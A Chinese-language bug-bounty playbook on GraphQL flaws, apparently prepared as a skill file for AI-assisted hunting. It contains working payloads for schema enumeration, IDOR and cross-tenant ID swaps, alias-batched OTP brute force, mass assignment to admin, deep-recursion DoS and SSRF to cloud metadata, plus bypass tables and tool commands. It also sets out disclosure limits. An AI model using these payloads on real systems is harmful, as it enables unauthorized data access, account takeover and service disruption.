# GraphQL 注入 / 越权

> 一个端点（通常 `/graphql`）承载全部 query / mutation。特有风险：Introspection 暴露 schema、字段级授权缺失、嵌套查询绕过顶层鉴权、别名批量绕过限频、深度递归 DoS。嵌套 IDOR + 字段越权 = P1。本地 src-hunter 命中本类的 H1 高危报告相对少，但单价高（HackerOne 自身曾披露 $25,000 的 GraphQL 越权）。

**取材来源**（本文件内容改编自，非整库复制）：
- [MyuriKanao/src-hunter-skill](https://github.com/MyuriKanao/src-hunter-skill)、`api-rest/{00-index,11-graphql}.md`
- [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter)（源自 12 份公开报告）
- [SnailSploit/Claude-Red](https://github.com/SnailSploit/Claude-Red)
- 权威公开源：PortSwigger / HackTricks（仅作背景）

---

## 1. 触发信号

- URL 路径为 `/graphql`、`/api/graphql`、`/graphiql`、`/playground`、`/gql`
- POST body 形如 `{"query":"...","variables":{}}`；响应含 `__typename`、`{"errors":[...]}`
- JS bundle 中出现 `ApolloClient`、`gql\``、`__typename`、`operationName`、`graphql-tag`
- 响应头 `Content-Type: application/json` 且路径无 REST 风格 path 参数
- 报错回显 `Cannot query field ...` 或 `Did you mean "xxx"?`

## 2. 高频入口点

**端点** `[本地 src-hunter graphql.md + Claude-Red offensive-graphql]`：

```
/graphql   /api/graphql   /v1/graphql   /api/v2/graphql   /query   /gql   /graph
/graphiql  /playground    /api-explorer  /graphql.php  /graphql.json  /internal/graphql
```

**确认是否 GraphQL** `[本地 src-hunter]`：

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"query{__typename}"}' https://target/graphql
# → {"data":{"__typename":"Query"}} = 是 GraphQL
```

## 3. 探测顺序（从最无害 → 最有杀伤力）

1. **确认端点 + `__typename` 探针**：`{ __typename }` 成功即可确认（即使完整 introspection 被禁）。
2. **Introspection**：拉全 schema，grep 敏感字段 `password/ssn/creditCard/apiKey/balance/secret/token`。被禁 → 用字段建议（"Did you mean?"）、`clairvoyance`、抓 JS bundle 里的 query。
3. **字段级越权**：顶层「看起来公开」的 query，嵌套返回 `email/orders/creditCard` 等敏感字段。
4. **IDOR via id / node(GID)**：改 `user(id:100)` → `user(id:200)`；Relay 全局 ID `base64("Type:123")` 跨对象、跨租户换 ID。
5. **mutation Mass Assignment**：mutation 的 input 里加 `isAdmin:true / role:ADMIN`。
6. **别名批量 / 深度递归**：绕过限频 / 测 DoS（证明时降到 10 层、几次请求）。
7. **拿最小证据即停**：越权读 3 个不同 ID 样本即可，不拖库。

## 4. Payload 区（每条标注出处）

### 4.1 Introspection（最先做）`[本地 src-hunter graphql.md + api-rest/11-graphql.md]`

```graphql
# 全量 introspection
query IntrospectionQuery {
  __schema {
    queryType { name } mutationType { name } subscriptionType { name }
    types { ...FullType }
    directives { name locations args { ...InputValue } }
  }
}
fragment FullType on __Type { kind name description fields(includeDeprecated: true) {
  name args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason }
  inputFields { ...InputValue } enumValues { name } possibleTypes { ...TypeRef } }
fragment InputValue on __InputValue { name type { ...TypeRef } defaultValue }
fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
```

```bash
# 一行拉 schema + 找敏感字段
curl -X POST -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name}}}}"}' https://target/graphql | jq > schema.json
grep -A5 -E "(password|ssn|credit|secret|key|token)" schema.json
```

**Introspection 被禁时的绕过** `[Claude-BugHunter hunt-graphql + Claude-Red]`：

```graphql
{ unknownField }        # 响应 "Did you mean: [realFieldName]?" → schema 仍可枚举
{ s: __schema { t: types { n: name } } }   # 别名绕过 WAF 对 __schema 的拦
# 或 clairvoyance 猜字段名
python3 clairvoyance.py -u https://target/graphql -w wordlist.txt -o schema.json
```

### 4.2 字段级越权 / IDOR `[本地 src-hunter graphql.md]`

```graphql
# 顶层公开 query，嵌套返回敏感字段
query {
  publicPost(id: 123) {
    title
    author { email phone orders { id amount creditCard } }   # ❌ 可能无字段级校验
  }
}

# IDOR：改 id
query { user(id: 200) { email privateMessages { content } } }

# Relay 全局 ID 跨租户（H1 #2207248 Shopify 案例）
query { billingDocumentDownload(id: "gid://shopify/BillingInvoice/<other_shop_id>") { url } }
```

### 4.3 别名批量 / mutation 越权 / DoS `[本地 src-hunter graphql.md + Claude-BugHunter]`

```graphql
# 别名批量爆破（一次请求触发 N 次，绕过限频）
mutation {
  v1: verifyOtp(code:"000001"){token}
  v2: verifyOtp(code:"000002"){token}
  v3: verifyOtp(code:"000003"){token}
}

# mutation Mass Assignment
mutation { updateUser(input: { id:1, name:"x", isAdmin:true, role:ADMIN }) { id name } }

# 未授权敏感 mutation（AS Watson / createAdminUser 模式，HackerOne 公开案例）
mutation { createAdminUser(input:{email:"x@x", role:"ADMIN", password:"..."}) { token } }

# 深度递归 DoS（证明时降到 10 层）
query { user(id:1) { friends { friends { friends { friends { ... } } } } } }
```

**SSRF via 参数** `[Claude-BugHunter hunt-graphql，H1 #1864188 EXNESS]`：

```graphql
query { allTicks(source: "http://169.254.169.254/latest/meta-data/") { ... } }
```

### 4.4 Bypass 矩阵 `[本地 src-hunter graphql.md §4 + Claude-Red]`

| 拦 | 绕 |
|---|---|
| Introspection 关闭 | 字段建议报错 / clairvoyance 猜字段 / 抓 JS bundle 里的 query |
| WAF 拦 `__schema` | 别名 `s: __schema` / HTTP 参数污染 / 换 Content-Type |
| 顶层鉴权 | 嵌套字段越权（顶层 query 公开，内层无校验） |
| 批量限频 | 别名 / 数组 batch（一个 POST 带多个 `{"query":...}`）|
| 深度限制 | 片段循环展开 `fragment F on User { ...F }` / `@defer`/`@stream` 分摊 |
| ID 类型校验 | String 改 Int、ID 改 null、换对象边界 / 换租户 token |
| Operation 白名单（persisted query）| `extensions.persistedQuery` hash 不匹配时是否回退到 ad-hoc query |

## 5. 工具用法

```bash
# graphql-cop / InQL / GraphQLmap / graphw00f
graphql-cop -t https://target/graphql          # 常见误配扫描
inql -t https://target/graphql --generate-queries   # Burp 插件，可视化 schema
graphqlmap                                      # 交互式攻击
graphw00f https://target/graphql                # 指纹底层实现（Apollo/Yoga/Hasura）

# 从 JS bundle 提取 query
grep -Eo '(query|mutation|subscription)\s+\w+\s*[\({]' bundle.js
grep -Eo '"(/[a-z0-9/_-]*graphql[a-z0-9/_-]*)"' bundle.js
```

> 纪律：别名爆破只在自己账号上演示，别撞真实账号；深度 DoS 10 层、几次请求即可，不打瘫服务。

## 6. 证据要求

**「已确认」必须满足**：Introspection 单独暴露 schema 不是漏洞（Low/信息），必须证明具体的越权读 / 越权写。

**PoC 模板（字段级越权 / IDOR）**：

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Authorization: Bearer A_TOKEN

{"query":"query{user(id:200){email phone}}"}
→ {"data":{"user":{"email":"b****@****.com","phone":"138****1234"}}}
（B 的字段，A 不该能读）
```

**CVSS 参考**：Introspection 暴露 = 5.3；嵌套 IDOR PII = 6.5–8.1；别名爆破 = 7.5；mutation Mass Assignment → admin = 8.8–9.8；深度递归 DoS = 5.3–6.5（本地 src-hunter graphql.md §7.3）。

## 7. 合规边界 / 不要做的事

- **禁**：别名爆破真实账号密码，只在自己测试账号上演示。
- **禁**：深度递归 DoS 实际打瘫服务，10 层、几次请求证明即可。
- **禁**：嵌套 IDOR 拖出大量数据，3 个不同 ID 的样本足够。
- **禁**：mutation Mass Assignment 创建 admin 后实际使用管理权限，仅证明 token 有 admin。
- **脱敏**：越权读到的 PII 只留前 2 + 后 2 字符。
